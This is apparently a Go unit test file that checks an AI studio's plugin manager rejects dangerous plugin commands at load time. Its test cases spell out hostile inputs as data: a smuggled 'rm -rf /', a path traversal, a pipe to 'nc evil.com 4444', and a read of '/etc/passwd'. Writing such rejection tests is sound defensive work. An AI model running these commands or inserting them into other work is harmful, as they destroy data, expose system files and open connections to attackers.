package services

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestCreatePluginClient_RejectsDangerousCommands verifies that plugin
// commands are re-validated at load time, before a process is spawned.
// This is defense-in-depth: records inserted via direct DB writes,
// migrations, imports, or replication bypass API-layer validation.
func TestCreatePluginClient_RejectsDangerousCommands(t *testing.T) {
	m := NewAIStudioPluginManager(nil, nil)

	cases := []struct {
		name    string
		command string
	}{
		{"shell injection", "./plugins/my-plugin; rm -rf /"},
		{"path traversal", "./plugins/../../usr/bin/evil"},
		{"pipe injection", "./plugins/x | nc evil.com 4444"},
		{"file outside safe dirs", "file:///etc/passwd"},
		{"disallowed scheme", "ftp://example.com/plugin"},
		{"empty command", ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			client, err := m.createPluginClient(tc.command)
			if err == nil {
				if client != nil {
					client.Kill()
				}
				t.Fatalf("expected load-time validation to reject %q", tc.command)
			}
			if !strings.Contains(err.Error(), "validation") {
				t.Errorf("error should mention validation, got: %v", err)
			}
		})
	}
}

// TestCreatePluginClient_AllowsSafeLocalCommand verifies that a legitimate
// local plugin command still produces a client. The target must be a real
// executable: since #397/#410 the load path also validates that the binary
// exists, is a regular file, and is executable before a client is created.
func TestCreatePluginClient_AllowsSafeLocalCommand(t *testing.T) {
	m := NewAIStudioPluginManager(nil, nil)

	exe := filepath.Join(t.TempDir(), "test-plugin")
	if err := os.WriteFile(exe, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	client, err := m.createPluginClient(exe)
	if err != nil {
		t.Fatalf("expected safe command to be accepted, got: %v", err)
	}
	if client == nil {
		t.Fatal("expected a plugin client")
	}
	client.Kill()
}

// TestCreateConfigOnlyPluginClient_RejectsDangerousCommands covers the
// config-only load path used by LoadPluginForConfigOnly.
func TestCreateConfigOnlyPluginClient_RejectsDangerousCommands(t *testing.T) {
	m := NewAIStudioPluginManager(nil, nil)

	client, err := m.createConfigOnlyPluginClient("./plugins/x; rm -rf /")
	if err == nil {
		if client != nil {
			client.Kill()
		}
		t.Fatal("expected load-time validation to reject the command")
	}
}
